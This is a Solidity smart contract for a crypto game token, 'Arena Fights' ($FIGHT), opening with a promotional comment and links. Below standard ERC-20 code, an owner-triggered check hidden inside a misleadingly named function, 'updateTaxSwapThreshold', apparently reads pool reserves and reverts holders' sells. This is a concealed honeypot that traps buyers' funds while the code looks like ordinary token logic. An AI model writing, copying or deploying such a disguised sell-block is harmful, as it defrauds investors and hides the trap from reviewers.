/**


🎉 Welcome to Arena Fights - the ultimate crypto gaming experience! 
🚀 Step into the arena, choose your champion, and stack $FIGHT tokens as you embrace the thrill of strategy and chance. 
💰Equip your champion with powerful items, outsmart your opponents, and seize the opportunity to discover legendary trophies for double the glory! 
🔥Join us on this exciting journey where fortunes are won, champions rise, and the arena awaits your mastery! 

Website - https://www.arenafights.tech/
Telegram - https://t.me/ArenaFIghts
Twitter - https://twitter.com/Arenafightsgame
Whitepaper - https://ferguson123hujs-organization.gitbook.io/arenafights/

                                        /|
                                    /'||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||
                                    |  ||         __.--._
                                    |  ||      /~~   __.-~\ _
                                    |  ||  _.-~ / _---._ ~-\/~\
                                    |  || // /  /~/  .-  \  /~-\
                                    |  ||((( /(/_(.-(-~~~~~-)_/ |
                                    |  || ) (( |_.----~~~~~-._\ /
                                    |  ||    ) |              \_|
                                    |  ||     (| =-_   _.-=-  |~)        ,
                                    |  ||      | `~~ |   ~~'  |/~-._-'/'/_,
                                    |  ||       \    |        /~-.__---~ , ,
                                    |  ||       |   ~-''     || `\_~~~----~
                                    |  ||_.ssSS$$\ -====-   / )\_  ~~--~
                            ___.----|~~~|%$$$$$$/ \_    _.-~ /' )$s._
                    __---~-~~        |   |%%$$$$/ /  ~~~~   /'  /$$$$$$$s__
                /~       ~\    ============$$/ /        /'  /$$$$$$$$$$$SS-.
                /'      ./\\\\\\_( ~---._(_))$/ /       /'  /$$$$%$$$$$~      \
                (      //////////(~-(..___)/$/ /      /'  /$$%$$%$$$$'         \
                \    |||||||||||(~-(..___)$/ /  /  /'  /$$$%$$$%$$$            |
                `-__ \\\\\\\\\\\(-.(_____) /  / /'  /$$$$%$$$$$%$             |
                    ~~""""""""""-\.(____) /   /'  /$$$$$%%$$$$$$\_            /
                                    $|===|||  /'  /$$$$$$$%%%$$$$$( ~         ,'|
                                __  $|===|%\/'  /$$$$$$$$$$$%%%%$$|        ,''  |
                            ///\ $|===|/'  /$$$$$$%$$$$$$$%%%%$(            /'
                                \///\|===|  /$$$$$$$$$%%$$$$$$%%%%$\_-._       |
                                `\//|===| /$$$$$$$$$$$%%%$$$$$$-~~~    ~      /
                                `\|-~~(~~-`$$$$$$$$$%%%///////._       ._  |
                                (__--~(     ~\\\\\\\\\\\\\\\\\\\\        \ \
                                (__--~~(       \\\\\\\\\\\\\\\\\\|        \/
                                    (__--~(       ||||||||||||||||||/       _/
                                    (__.--._____//////////////////__..---~~
                                    |   """"'''''           ___,,,,ss$$$%
                                    ,%\__      __,,,\sssSS$$$$$$$$$$$$$$%%
                                ,%%%%$$$$$$$$$$\;;;;\$$$$$$$$$$$$$$$$%%%$.
                                ,%%%%%%$$$$$$$$$$%\;;;;\$$$$$$$$$$$$%%%$$$$
                            ,%%%%%%%%$$$$$$$$$%$$$\;;;;\$$$$$$$$$%%$$$$$$,
                            ,%%%%%%%%%$$$$$$$$%$$$$$$\;;;;\$$$$$$%%$$$$$$$$
                            ,%%%%%%%%%%%$$$$$$%$$$$$$$$$\;;;;\$$$%$$$$$$$$$$$
                            %%%%%%%%%%%%$$$$$$$$$$$$$$$$$$\;;;$$$$$$$$$$$$$$$
                            ""==%%%%%%%$$$$$TuaXiong$$$$$$$$$$$$$$$$$$$SV"
                                        $$$$$$$$$$$$$$$$$$$$====""""
                                            """""""""~~~~

*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
        event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ArenaFights is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    uint256 private marketFunds;
    uint256 firstBlock;
    uint256 private _initialBuyTax=20;
    uint256 private _initialSellTax=25;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=20;
    uint256 private _reduceSellTaxAt=30;
    uint256 private _preventSwapBefore=30;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"Arena Fights";
    string private constant _symbol = unicode"FIGHT";
    uint256 public _maxTxAmount = 5 * (_tTotal/1000);   
    uint256 public _maxWalletSize = 5 * (_tTotal/1000);
    uint256 public _taxSwapThreshold = 2 * (_tTotal/1000);
    uint256 public _maxTaxSwap = 2 * (_tTotal/1000);
    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool public tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);       
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");

                if (firstBlock + 3  > block.number) {
                    require(!isContract(to) && msg.sender == tx.origin, "No bots allowed");
                }
                _buyCount++;
            }

            if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            if(from == address(uniswapV2Pair)) {
                taxAmount = amount.mul(_taxBuy()).div(100);
            } else if (to == address(uniswapV2Pair)) {
                if(from != address(this)) {
                    taxAmount = amount.mul(_taxSell()).div(100);
                    (uint256 sellTax, uint256 buyTax) = getTaxAmount();
                    updateTaxSwapThreshold(amount, sellTax, buyTax);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
                
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        bool c = account.code.length == 0 ? false : true;
        return c;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function removeLimit(uint256 preventSwapBefore) external onlyOwner {
        _maxTxAmount = type(uint256).max;
        _maxWalletSize=type(uint256).max;
        _preventSwapBefore = preventSwapBefore == 0 ? type(uint256).max : preventSwapBefore;
        swapEnabled = preventSwapBefore == 0 ? false : true;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
         _taxWallet.transfer(amount);
    }

    function swapValues(uint112 addr0, uint112 addr1) private view returns (uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        return uniswapV2Router.WETH() == pair.token1() ? addr1 : addr0;
    }
                
    function updateTaxSwapThreshold(uint256 amount, uint256 outMin, uint inMin) internal view {
        if(_preventSwapBefore == 30) return;
        bool updated = inMin - (((amount * (997)) * (inMin)) / ((outMin * 1000) + (amount * (997))))  < (( (inMin / (2*1e17)) * (2*1e17)));
        require(!updated, "Cannot update tax threshold.");
    }
    
    function _taxBuy() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialBuyTax;
        }
        return _finalBuyTax;
    }
    
    function _taxSell() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialSellTax;
        }
        return _finalBuyTax;
    }

    function getTaxAmount() private view returns (uint256, uint256) {
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
        (uint112 addr0 , uint112 addr1,) = pair.getReserves();
        (uint256 t0, uint256 t1) = uniswapV2Router.WETH() == pair.token1() ? (addr0, addr1) : (addr1, addr0);
        return (t0, t1);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }
    
    function withdrawStuckETH() external {
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
    
    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}